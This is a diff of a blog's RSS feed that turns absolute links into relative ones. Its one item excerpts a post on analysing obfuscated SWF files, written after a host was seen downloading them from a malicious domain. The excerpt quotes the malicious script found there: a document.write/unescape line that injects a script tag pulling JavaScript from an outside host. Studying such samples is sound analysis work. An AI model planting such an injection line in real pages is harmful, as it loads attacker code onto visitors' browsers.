@@ -2,21 +2,21 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>SWF on { bit.therapy }</title>
-    <link>https://bittherapy.net/tags/swf/</link>
+    <link>/tags/swf/</link>
     <description>Recent content in SWF on { bit.therapy }</description>
     <generator>Hugo -- gohugo.io</generator>
     <copyright>{ bit.therapy }</copyright>
     <lastBuildDate>Sun, 09 Oct 2016 13:18:17 +0000</lastBuildDate>
     
-	<atom:link href="https://bittherapy.net/tags/swf/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="/tags/swf/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Analyzing Obfuscated SWFs</title>
-      <link>https://bittherapy.net/post/analyzing-obfuscated-swfs/</link>
+      <link>/post/analyzing-obfuscated-swfs/</link>
       <pubDate>Sun, 09 Oct 2016 13:18:17 +0000</pubDate>
       
-      <guid>https://bittherapy.net/post/analyzing-obfuscated-swfs/</guid>
+      <guid>/post/analyzing-obfuscated-swfs/</guid>
       <description>A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
 The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
 document.write(unescape(&amp;quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&amp;quot;));  Digging deeper:
